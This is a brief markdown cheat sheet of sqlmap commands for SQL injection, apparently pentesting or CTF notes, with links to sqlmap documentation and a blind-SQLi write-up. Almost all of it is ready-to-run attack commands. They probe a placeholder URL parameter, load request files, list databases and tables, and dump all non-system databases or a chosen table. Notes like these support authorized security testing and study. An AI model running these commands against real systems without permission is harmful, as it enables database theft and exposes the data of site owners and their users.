# SQL Injection

## Links

- [sqlmap](https://github.com/sqlmapproject/sqlmap)
- [sqlmap Usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
- [SocketSQL](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html)

## First run (no interaction)

```sh
sqlmap --batch -u http://URL/?PARAM=1
```

## Dump all databases

```sh
sqlmap --dump-all --exclude-sysdbs --batch -u http://URL/?PARAM=1
```

## Load request data from file

```sh
sqlmap --dump-all --exclude-sysdbs --batch -r FILE
```

## Select the params

```sh
sqlmap -r FILE -p PARAM1,PARAM2
```

## List all databases

```sh
sqlmap -u http://URL/?PARAM=1 --dbs
```

## List tables from database

```sh
sqlmap -u http://URL/?PARAM=1 -D DATABASE --tables
```

## Dump table

```sh
sqlmap -u http://URL/?PARAM=1 -D DATABASE -T TABLE --dump
```
